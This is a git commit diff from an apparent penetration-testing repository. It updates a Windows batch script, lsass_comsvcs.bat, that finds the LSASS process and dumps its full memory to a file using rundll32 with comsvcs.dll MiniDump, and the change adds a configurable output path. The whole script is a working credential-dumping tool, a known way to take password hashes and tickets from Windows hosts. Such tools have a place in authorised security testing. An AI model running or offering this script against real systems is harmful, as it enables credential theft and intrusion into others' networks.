dfcca6ee9e4b6d7b30092a55aaa15a530560bc7c
PentestPlaybook <123711693+PentestPlaybook@users.noreply.github.com>
2026-06-12 19:41:05 -0700

    Enhance lsass_comsvcs.bat for dynamic output file

--- lsass_comsvcs.bat
+++ lsass_comsvcs.bat
@@ -1,6 +1,19 @@
 @echo off
+setlocal EnableDelayedExpansion
+
+if "%~1"=="" goto :default
+
+set OUTFILE=%~f1
+if "!OUTFILE:~-1!"=="\" set OUTFILE=!OUTFILE:~0,-1!
+if exist "!OUTFILE!\" set OUTFILE=!OUTFILE!\lsass_comsvcs.dmp
+goto :run
+
+:default
+set OUTFILE=%~dp0lsass_comsvcs.dmp
+
+:run
 for /f "tokens=2" %%i in ('C:\Windows\System32\tasklist.exe /fi "imagename eq lsass.exe" /nh') do set PID=%%i
 echo LSASS PID: %PID%
-C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %PID% .\lsass_comsvcs.dmp full
+C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %PID% "!OUTFILE!" full
 echo Done.
-dir .\lsass_comsvcs.dmp
+dir "!OUTFILE!"
